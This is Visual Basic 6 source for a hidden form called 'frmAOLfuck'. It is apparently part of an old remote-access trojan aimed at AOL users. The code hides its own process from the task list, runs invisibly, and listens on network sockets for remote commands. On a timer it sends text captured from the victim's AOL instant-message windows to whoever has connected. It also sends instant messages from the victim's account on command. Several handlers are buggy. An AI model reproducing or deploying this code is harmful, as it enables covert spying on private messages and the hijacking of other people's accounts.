VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmAOLfuck 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   ClientHeight    =   465
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1590
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   465
   ScaleWidth      =   1590
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   16
      Left            =   1080
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Index           =   0
      Left            =   600
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   120
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmAOLfuck"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim msgCNi As Boolean




Private Sub Form_Load()
Dim wss As Winsock

    Dim pid As Long
    Dim reserv As Long
    pid = GetCurrentProcessId()
    regserv = RegisterServiceProcess(pid, 1)


For Each wss In Winsock
Winsock1(wss.Index).Listen
Next

For Each wss In Winsock
Winsock2(wss.Index).Listen
Next
End Sub

Private Sub Timer1_Timer()
    
    If msgCNi = True Then Winsock2(Index).SendData mdAOLfuck.AOL40TextFromIm
    
End Sub

Private Sub Winsock1_Close(Index As Integer)
msgCNi = False
End Sub

Private Sub Winsock1_Connect(Index As Integer)

End Sub

Private Sub Winsock1_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
Load Winsock1(Winsock1.UBound + 1)
Winsock1(Winsock1.UBound).Accept (requestID)
err:
Exit Sub
End Sub

Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim DataA As String
Dim msg As String
Dim scrn As String

    Winsock1(Index).GetData DataA, vbString
msgCNi = True
If InStr(DataA, "scrn/") Then
scrn = Right(DataA, Len(DataA) - 5)
End If

If InStr(DataA, "msg/") Then
msg = Right(DataA, Len(DataA) - 4)
End If

If InStr(DataA, "*/*") Then
    mdAOLfuck.AOLInstantMessage scrn, msg
End If



End Sub

Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Unload Winsock1(Index)
msgCNi = False
End Sub

Private Sub Winsock2_Close(Index As Integer)
msgCNi = False
End Sub

Private Sub Winsock2_Connect(Index As Integer)

End Sub

Private Sub Winsock2_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
Load Winsock2(Winsock2.UBound + 1)
Winsock1(Winsock2.UBound).Accept (requestID)
err:
Exit Sub
End Sub

Private Sub Winsock2_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Unload Winsock2(Index)
msgCNi = False
End Sub
